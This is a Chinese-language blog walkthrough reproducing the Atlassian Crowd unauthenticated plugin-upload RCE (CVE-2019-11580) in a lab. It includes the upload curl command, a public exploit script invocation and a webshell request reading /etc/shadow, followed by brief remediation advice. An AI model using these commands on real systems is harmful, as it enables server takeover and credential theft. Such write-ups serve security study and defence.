# Atlassian Crowd未授权访问漏洞



#### 漏洞概述
Atlassian Crowd和Atlassian Crowd Data Center都是澳大利亚Atlassian公司的产品。Atlassian Crowd是一套基于Web的单点登录系统。该系统为用用户、网络应用程序和目录服务器提供验证、授权等功能。Atlassian Crowd Data Center是Crowd的集群部署版。Atlassian Crowd和Crowd Data Center在其某些发行版本中错误地启用了了pdkinstall开发插件,使其存在安全漏漏洞洞。攻击者利用该漏洞可在未授权访问的情况下对Atlassian Crowd和Crowd Data Center安装任意的恶意插件,执行任意代码/命令,从而获得服务器权限


#### 环境搭建
```bash
wget https://product-downloads.atlassian.com/software/crowd/downloads/atlassian-crowd-3.4.3.zip
unzip atlassian-crowd-3.4.3.zip

cd atlassian-crowd-3.4.3
vim crowd-webapp/WEB-INF/classes/crowd-init.properties    #修改crowd-init.properties 配置文件，设置主目录
    crowd.home=/var/crowd-home    # 主目录位置(根据自己的写)

# 执行启动命令
./start_crowd.sh
```
浏览器访问`http://192.168.0.100:8095` 点击`Set up Crowd`
这里去官网申请试用30天`https://my.atlassian.com/products/index`并填写到license 进行下一步安装,直到安装完成。


###### 未授权访问测试
安装完成之后在插件目录会有一些插件`bundled-plugins`
上传一个标准的插件,来自atlassian-bundled-plugins中的`applinks-plugin-5.4.12.jar`
```bash
curl --form "file_cdl=@applinks-plugin-5.4.12.jar" http://192.168.0.100:8095/crowd/admin/uploadplugin.action -v
```


###### Atlassian Crowd RCE
该漏洞源于网络系统或产品未对输入的数据进行正确的验证。受影响的产品及版本包括：Atlassian Crowd 2.1.x版本，3.0.5之前的3.0.x版本，3.1.6之前的3.1.x版本，3.2.8之前的3.2.x版本，3.3.5之前的3.3.x版本，3.4.4之前的3.4.版本；Atlassian Crowd Data Center 2.1.x版本，3.0.5之前的3.0.x版本，3.1.6之前的3.1.x版本，3.2.8之前的3.2.x版本，3.3.5之前的3.3.x版本，3.4.4之前的3.4.版本。

漏洞利用脚本：`https://github.com/jas502n/CVE-2019-11580`
```bash
git clone https://github.com/jas502n/CVE-2019-11580
cd CVE-2019-11580/
python CVE-2019-11580.py http://192.168.0.100:8095

# 通过浏览器访问链接测试其他命令
curl http://192.168.0.100:8095/crowd/plugins/servlet/exp?cmd=cat%20/etc/shadow
```




#### 防御手段
- 设置访问`/crowd/admin/uploadplugin.action`的源ip
- 升级最新版本(3.5.0以上)。










---

> 作者: [剑胆琴心](http://geoer.cn)  
> URL: https://shuai06.github.io/atlassian-crowd%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/  

